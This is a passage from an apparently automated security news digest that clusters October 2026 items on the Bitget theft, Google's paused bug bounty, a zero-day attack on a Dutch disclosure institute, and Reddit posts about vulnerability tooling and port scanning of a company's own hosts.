Cryptocurrency exchange Bitget on Wednesday confirmed that attackers who stole $387.5 million last week exploited a zero-day flaw in third-party security products, citing ongoing investigation findings from SlowMist. "Their investigation identified malicious activity involving third-party security products, including a zero-day vulnerability, and recovered a customized tool used by the attacker
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft
  - Published: 2026-10-01T05:21:10+00:00
  - Link: https://thehackernews.com/2026/10/bitget-confirms-third-party-zero-day.html
  - Summary: Cryptocurrency exchange Bitget on Wednesday confirmed that attackers who stole $387.5 million last week exploited a zero-day flaw in third-party security products, citing ongoing investigation findings from SlowMist. "Their investigation identified malicious activity involving third-party security products, including a zero-day vulnerability, and recovered a customized tool used by the attacker

### Cluster 7dd217f11f — score 8

- Title: Google Suspends Open-Source Bug Bounty Due to AI Vulnerability Reports
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-05T10:30:00+00:00
- Link: https://www.infosecurity-magazine.com/news/google-suspends-opensource-bug/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Google has paused its Open Source Vulnerability Rewards Program due to a flood of AI submissions
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Google Suspends Open-Source Bug Bounty Due to AI Vulnerability Reports
  - Published: 2026-10-05T10:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/google-suspends-opensource-bug/
  - Summary: Google has paused its Open Source Vulnerability Rewards Program due to a flood of AI submissions

### Cluster 0d3ce97f33 — score 8

- Title: Two Zero-Days Exploited in Attack on Dutch Institute for Vulnerability Disclosure
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-02T08:25:00+00:00
- Link: https://www.infosecurity-magazine.com/news/zerodays-dutch-institute/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
The Dutch Institute for Vulnerability Disclosure reveals agentic AI-powered attack using Zammad zero-days
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Two Zero-Days Exploited in Attack on Dutch Institute for Vulnerability Disclosure
  - Published: 2026-10-02T08:25:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/zerodays-dutch-institute/
  - Summary: The Dutch Institute for Vulnerability Disclosure reveals agentic AI-powered attack using Zammad zero-days

### Cluster 43d1cffe8c — score 8

- Title: Vulnerability management
- Source: Reddit r/cybersecurity (reddit_practitioner_osint)
- Published: 2026-10-07T15:57:06+00:00
- Link: https://www.reddit.com/r/cybersecurity/comments/1x0097i/vulnerability_management/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
Looking for the best vulnerability management tool that works alongside an EDR, checked out tennable and qualys but price seems quite steep, any other recommendations that perform just as well but at less cost? submitted by /u/SadSeaworthiness5386 [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - Title: Vulnerability management
  - Published: 2026-10-07T15:57:06+00:00
  - Link: https://www.reddit.com/r/cybersecurity/comments/1x0097i/vulnerability_management/
  - Summary: Looking for the best vulnerability management tool that works alongside an EDR, checked out tennable and qualys but price seems quite steep, any other recommendations that perform just as well but at less cost? submitted by /u/SadSeaworthiness5386 [link] [comments]

### Cluster 98152323ca — score 8

- Title: AppSec hire with no mentor: is my external scanning workflow correct, and what should I add next?
- Source: Reddit r/cybersecurity (reddit_practitioner_osint)
- Published: 2026-10-07T13:06:30+00:00
- Link: https://www.reddit.com/r/cybersecurity/comments/1wzw1j3/appsec_hire_with_no_mentor_is_my_external/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- threat_categories: active_exploitation
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Summary

```
I got this new job as an AppSec and I was thrown in the wild with no mentoring so I have to guide myself I guess. Manager gave me a list of IPs. a file that contains 200+ IPs related to company infrastructure along some 100+ URLs for companys apps. This is an automated scan so I'm skipping opening burp and going through each application. first thing I did is run masscan on the list of IPS "masscan -p1-65535 --rate=1000 -iL ips_list.txt -oG masscan_results.scan" I want to identify what was running on each ip so I though this would discover all the ports. I set the rate limit to 1000 so I don't crash the servers or get my IP banned. but this scan took too long after 1h20 it was only at 40% and I accidentally stopped it. then I run "sudo masscan --top-ports 1000 --max-rate 3000 -iL ips_all_unique.txt -oG masscan_results.scan" this one was quick as it scanned only the top ports. then i used this script to organize results. to pass them to nmap " awk '/Host:/ { ip=$4; split($7, p, "/"); por
```

#### Corroborating sources (1)

- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - Title: AppSec hire with no mentor: is my external scanning workflow correct, and what should I add next?
  - Published: 2026-10-07T13:06:30+00:00
  - Link: https://www.reddit.com/r/cybersecurity/comments/1wzw1j3/appsec_hire_with_no_mentor_is_my_external/
  - Summary: I got this new job as an AppSec and I was thrown in the wild with no mentoring so I have to guide myself I guess. Manager gave me a list of IPs. a file that contains 200+ IPs related to company infrastructure along some 100+ URLs for companys apps. This is an automated scan so I'm skipping opening burp and going through each application. first thing I did is run masscan on the list of IPS "masscan -p1-65535 --rate=1000 -iL ips_list.txt -oG masscan_results.scan" I want to identify what was running on each ip so I though this would discover all the ports. I set the rate limit to 1000 so I don't crash the servers or get my IP banned. but this scan took too long after 1h20 it was only at 40% and I accidentally stopped it. then I run "sudo masscan --top-ports 1000 --max-rate 3000 -iL ips_all_unique.txt -oG masscan_results.scan" this one was quick as it scanned only the top ports. then i used this script to organize results. to pass them to nmap " awk '/Host:/ { ip=$4; split($7, p, "/"); por
